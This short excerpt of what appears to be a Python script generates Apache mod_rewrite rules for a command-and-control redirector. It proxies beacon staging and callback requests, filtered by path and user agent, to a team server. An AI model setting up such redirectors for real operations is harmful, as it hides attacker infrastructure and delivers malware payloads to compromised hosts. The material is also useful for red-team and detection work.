...
#RewriteRule ^.*$ "http://TEAMSERVER%{{REQUEST_URI}}" [E=backend_name:c2-{backend},P,L]

#RewriteCond %{{REQUEST_URI}} !^/$
#RewriteCond %{{REMOTE_ADDR}} ^IPADDRESSHERE [OR]
# ...
#RewriteRule ^.*$ "{redirect}%{{REQUEST_URI}}" [E=backend_name:c2-{backend},P,L]

## Default Beacon Staging Support (/1234)
RewriteCond %{{REQUEST_METHOD}} GET [NC]
RewriteCond %{{REQUEST_URI}} ^/..../?$
RewriteCond %{{HTTP_USER_AGENT}} "{ua}"
RewriteRule ^.*$ "{c2server}%{{REQUEST_URI}}" [E=backend_name:c2-{backend},P,L]
...
htaccess = htaccess_template.format(uris=uris_string, ua=ua_string, c2server=args.c2server, redirect=args.redirect, backend=str(args.redirect).split('/')[2])
if args.out_file:
